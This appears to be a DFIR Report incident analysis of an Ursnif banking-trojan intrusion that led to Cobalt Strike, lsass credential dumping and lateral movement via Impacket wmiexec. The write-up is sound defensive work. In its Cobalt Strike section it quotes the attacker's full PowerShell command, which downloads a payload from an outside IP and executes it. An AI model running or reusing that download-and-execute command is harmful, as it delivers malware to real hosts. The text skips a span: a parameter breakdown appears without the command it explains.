<h1 class="entry-title">Unwrapping Ursnifs Gifts</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/" rel="bookmark"><time class="entry-date published" datetime="2023-01-09T02:16:40+00:00">January 9, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p>In late August 2022, we investigated an incident involving Ursnif malware, which resulted in Cobalt Strike being deployed. This was followed by the threat actors moving laterally throughout the environment using an admin account.</p>
<p>The <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.gozi" target="_blank" rel="noopener">Ursnif malware family</a> (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today. It has an extensive past of code forks and evolutions that has lead to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3 and most recently, LDR4.</p>
<p>For this report, we have referred to the malware as Ursnif for simplicity, however we also recommend reading <a href="https://www.mandiant.com/resources/blog/rm3-ldr4-ursnif-banking-fraud" target="_blank" rel="noreferrer noopener">Mandiant&#8217;s article on LDR4</a>.</p>

<h2 class="wp-block-heading" id="case-summary"><a href="#case-summary">Case Summary</a></h2>
<p>In this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware. The malware displayed an interesting execution flow, which included using a renamed copy of rundll32. Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as <a href="https://thedfirreport.com/2022/04/25/quantum-ransomware/" target="_blank" rel="noreferrer noopener">IcedID</a>. The malware also established persistence on the host with the creation of a registry run key.</p>
<p>Approximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard). The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions.</p>
<p>The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping. Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials.</p>
<p>Using the credentials extracted from memory, the threat actors began to move laterally. They targeted a domain controller and used Impacket&#8217;s <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noreferrer noopener">wmiexec.py</a> to execute code on the remote host. This included executing both a msi installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon. These files were transferred to the domain controller over SMB.</p>
<p>After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller. Finally, they dropped a script named <code>adcomp.bat</code> which executed a PowerShell command to collect data on computers in the Windows domain.</p>
<p>The following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day. At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller. From there, the threat actor began connecting to various hosts across the network.</p>
<p>One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session. The threat actor was later evicted from the network.</p>

<p><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-13552" src="https://thedfirreport.com/wp-content/uploads/2023/01/Unwrapping-Ursnifs-Gifts.png" alt width="2151" height="3406" srcset="https://thedfirreport.com/wp-content/uploads/2023/01/Unwrapping-Ursnifs-Gifts.png 2151w, https://thedfirreport.com/wp-content/uploads/2023/01/Unwrapping-Ursnifs-Gifts-189x300.png 189w, https://thedfirreport.com/wp-content/uploads/2023/01/Unwrapping-Ursnifs-Gifts-647x1024.png 647w, https://thedfirreport.com/wp-content/uploads/2023/01/Unwrapping-Ursnifs-Gifts-768x1216.png 768w, https://thedfirreport.com/wp-content/uploads/2023/01/Unwrapping-Ursnifs-Gifts-970x1536.png 970w, https://thedfirreport.com/wp-content/uploads/2023/01/Unwrapping-Ursnifs-Gifts-1293x2048.png 1293w" sizes="(max-width: 2151px) 100vw, 2151px" /></p>
<p>Analysis and reporting completed by <a href="https://twitter.com/_pete_0" target="_blank" rel="noreferrer noopener">@_pete_0</a>, <a href="https://twitter.com/svch0st" target="_blank" rel="noopener">@svch0st</a> and UC1.</p>
<h2 class="wp-block-heading" id="initial-access"><a href="#initial-access">Initial Access</a></h2>
<p>In this case, the Ursnif malware was delivered using a very familiar technique of being contained within an ISO file.</p>
<p>The DFIR Report has previously reported on several incidents that involved the tactic of delivering malicious flies using ISO files:</p>
<ul class="wp-block-list">
<li><a href="https://thedfirreport.com/2022/04/25/quantum-ransomware/" target="_blank" rel="noreferrer noopener">Quantum Ransomware</a></li>
<li><a href="https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/" target="_blank" rel="noreferrer noopener">BumbleBee Roasts Its Way to Domain Admin</a></li>
<li><a href="https://thedfirreport.com/2022/09/26/bumblebee-round-two/" target="_blank" rel="noreferrer noopener">BumbleBee: Round Two</a></li>
<li><a href="https://thedfirreport.com/2021/12/13/diavol-ransomware/" target="_blank" rel="noreferrer noopener">Diavol Ransomware</a></li>
</ul>

<h3 class="wp-block-heading">Cobalt Strike</h3>
<p>An instance of cmd.exe was launched through explorer.exe which ran the following command:</p>
<pre class="wp-block-preformatted">powershell.exe  -nop -c "start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'hxxp://193.201.9.199:80/a’ -Destination $d; $t = [IO.File]::ReadAllText($d); Remove-Item $d; IEX $t } -Argument 0 | wait-job | Receive-Job"</pre>
<p><em>Analyst Note: Ursnif has been known to have VNC-like capabilities. It is possible this explorer.exe ➝ cmd.exe session was through a VNC session.</em></p>
<p>This PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%. It then read the file into a variable, and deleted it before executing content with <code>IEX</code>.</p>
<p>The event log <code>Microsoft-Windows-Bits-Client%254Operational.evtx</code> corroborated this activity:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/01/17386-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-13502" src="https://thedfirreport.com/wp-content/uploads/2023/01/17386-011.png" alt width="653" height="287" srcset="https://thedfirreport.com/wp-content/uploads/2023/01/17386-011.png 653w, https://thedfirreport.com/wp-content/uploads/2023/01/17386-011-300x132.png 300w" sizes="(max-width: 653px) 100vw, 653px" /></a></p>

<p>The command can be broken down as follows:</p>
<ul>
<li>&#8216;Q&#8217; indicates turn off echo &#8211; no response.</li>
<li>&#8216;C&#8217; indicates to stop after command execution.</li>
<li>The 127.0.01 and ADMIN$ indicates C:\Windows.</li>
<li>Output is achieved via the parameter &#8216;2&gt;&amp;1&#8217;, to redirect errors and output to one file:</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/01/17386-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-13506" src="https://thedfirreport.com/wp-content/uploads/2023/01/17386-015.png" alt width="597" height="32" srcset="https://thedfirreport.com/wp-content/uploads/2023/01/17386-015.png 597w, https://thedfirreport.com/wp-content/uploads/2023/01/17386-015-300x16.png 300w" sizes="(max-width: 597px) 100vw, 597px" /></a></p>
<p>This command line closely resembles the code within the <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a> as part of the Impacket tool maintained by Fortra.</p>
<p>As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/01/17386-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-13507" src="https://thedfirreport.com/wp-content/uploads/2023/01/17386-016.png" alt width="729" height="34" srcset="https://thedfirreport.com/wp-content/uploads/2023/01/17386-016.png 729w, https://thedfirreport.com/wp-content/uploads/2023/01/17386-016-300x14.png 300w" sizes="(max-width: 729px) 100vw, 729px" /></a></p>
<p>The use of Impacket by threat actors has been recently detailed by CISA in alert <a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-277a" target="_blank" rel="noopener">AA22-277A &#8211; Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/01/17386-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-13508" src="https://thedfirreport.com/wp-content/uploads/2023/01/17386-017.png" alt width="696" height="336" srcset="https://thedfirreport.com/wp-content/uploads/2023/01/17386-017.png 696w, https://thedfirreport.com/wp-content/uploads/2023/01/17386-017-300x145.png 300w" sizes="(max-width: 696px) 100vw, 696px" /></a></p>
